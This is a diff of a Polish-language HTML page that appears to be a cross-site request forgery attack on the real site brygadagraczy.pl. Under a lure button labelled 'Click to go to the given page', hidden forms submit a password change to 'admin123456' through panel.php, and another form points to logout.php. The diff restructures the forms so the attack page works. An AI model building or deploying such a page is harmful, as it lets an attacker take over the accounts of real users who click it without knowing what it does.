@@ -58,7 +58,7 @@
 
 <div id="input-box">
 	<div class="title">
-		<div class="display">Przekierowanie na podstronę</div>
+		<div class="display">Kliknij, aby przejść na podaną stronę</div>
 	</div>
 	
 	<div id="data">
@@ -68,14 +68,14 @@
 			<input type="hidden" name="password2" value="admin123456"/>
 			<input type="hidden" name="changePass" value=""/>
 			<button name="doLogin" class="inputButton">Przejdź</button>
-			<form action="https://brygadagraczy.pl/panel.php?a=setnick" method="post">
-				<input type="hidden" name="password" value="admin123456"/>
-				<input type="hidden" name="password2" value="admin123456"/>
-				<input type="hidden" name="changePass" value=""/>
-			</form>
-			<form action="https://brygadagraczy.pl/logout.php" method="get">
-			</form>
 		</div>
+		</form>
+		<form action="https://brygadagraczy.pl/panel.php?a=setnick" method="post">
+			<input type="hidden" name="password" value="admin123456"/>
+			<input type="hidden" name="password2" value="admin123456"/>
+			<input type="hidden" name="changePass" value=""/>
+		</form>
+		<form action="https://brygadagraczy.pl/logout.php" method="get">
 		</form>
 	</div>
 
